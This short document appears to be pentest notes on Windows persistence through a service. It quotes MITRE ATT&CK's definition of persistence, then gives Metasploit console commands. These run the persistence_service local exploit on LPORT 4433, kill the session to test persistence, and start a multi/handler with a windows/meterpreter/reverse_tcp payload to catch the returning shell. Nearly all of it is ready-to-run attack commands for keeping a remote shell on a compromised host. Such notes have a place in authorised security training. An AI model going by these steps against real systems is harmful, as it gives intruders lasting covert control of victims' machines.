# Persistence via services

"Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code." (MITRE ATT&CK)

See here : <https://attack.mitre.org/matrices/enterprise/>

## Technics via Metasploit

```text
msf6 > background
msf6 > use exploit/windows/local/persistence_service
msf6 > set LPORT 4433
msf6 > run
```

## Persistence testing

```text
msf6 > sessions
msf6 > sessions -k 1
msf6 > exit
```

```text
msf6 > msfconsole
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST eth1
msf6 > set LPORT 4433
msf6 > run
```

